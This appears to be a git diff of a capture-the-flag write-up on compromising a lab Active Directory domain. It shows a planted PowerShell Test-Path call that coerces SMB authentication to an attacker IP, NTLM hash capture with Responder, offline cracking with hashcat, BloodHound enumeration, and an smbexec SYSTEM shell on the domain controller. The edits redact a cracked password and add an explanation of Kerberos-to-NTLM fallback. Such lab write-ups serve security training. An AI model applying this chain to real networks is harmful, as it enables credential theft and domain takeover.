@@ -84,7 +84,7 @@ Test-Path \\10.146.82.44\icons\icon.ico
 
 ![Plant-File-Creation](proxyimg/plant-file.jpeg)
 
-We placed the file on the `IT-Shared`, the share which `svc.scanner` periodically scans
+We placed the file on the `IT-Shared`, the share which `svc.scanner` periodically scans.
 
 ![Plant-File](proxyimg/file-plant.jpeg)
 
@@ -92,7 +92,11 @@ We then initiated Responder to listen for incoming connection requests
 
 ![Responder](proxyimg/responder.jpeg)
 
-svc.scanner's automated process runs our `test.ps1` and hits the `Test-Path \\10.146.82.44\icons\icon.ico` line. The target then opens an SMB connection to our machine to check for the existence of the icon file. Our responder catches the incoming authentication connection and initiates NTLM authentication, issuing a challenge. The target machine signs the challenge with their password hash and sends it back.
+svc.scanner's automated process runs our `test.ps1` and hits the `Test-Path \\10.146.82.44\icons\icon.ico` line. The target then opens an SMB connection to our machine to check for the existence of the icon file.
+
+Windows commonly uses Kerberos for authentication in Active Directory environments. However, when Kerberos is unavailable or cannot be used, Windows may fall back to NTLM authentication
+
+ Our responder catches the incoming authentication connection and initiates NTLM authentication, issuing a challenge. The target machine signs the challenge with their password hash and sends it back.
 
 Responder receives `svc.scanner` NTLM hash and we save it to a file. We then use hashcat (mode 5600) to crack the NTLMv2 hash offline against the rockyou.txt wordlist
 
@@ -118,7 +122,7 @@ With a foothold now in the network, we look to gather a better picture on how th
 
 
 ```bash
-bloodhound-ce.py --zip -c All -d ctf.local -u 'svc.scanner' -p '1summerlove!' -dc DC01.ctf.local -ns 10.146.175.176
+bloodhound-ce.py --zip -c All -d ctf.local -u 'svc.scanner' -p 'REDACTED' -dc DC01.ctf.local -ns 10.146.175.176
 ```
 
 `BloodHound` reveals that svc.scanner has `AllowedToDelegate` to the CIFS service on DC01. 
@@ -141,10 +145,9 @@ Using the cached ticket, we use `smbexec.py` to authenticate to DC01 over SMB. W
 
 Upon successful authentication, a semi-interactive SYSTEM shell is spawned on the Domain controller. We find the flag on the Desktop of the Administrator and output it's content.
 
-![Shell-Flag](proxyimg/shell-flag.jpeg)
+![Shell-Flag](proxyimg/shell-flag-redac.jpeg)
 
 
 
 ---
 
-#### Key Takeaway
